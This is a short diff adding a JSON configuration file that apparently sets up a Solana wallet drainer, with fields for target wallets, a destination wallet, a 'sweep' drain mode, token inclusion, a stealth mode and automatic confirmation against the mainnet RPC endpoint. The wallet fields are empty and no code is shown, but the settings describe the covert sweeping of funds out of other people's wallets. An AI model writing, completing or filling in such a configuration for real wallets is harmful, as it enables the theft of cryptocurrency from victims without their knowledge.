@@ -1,0 +1,11 @@
+{
+    "target_wallets": [],
+    "destination_wallet": "",
+    "drain_mode": "sweep",
+    "min_balance_sol": 0.01,
+    "include_tokens": true,
+    "rpc_endpoint": "https://api.mainnet-beta.solana.com",
+    "stealth_mode": true,
+    "auto_confirm": true,
+    "priority_fee": 50000
+}
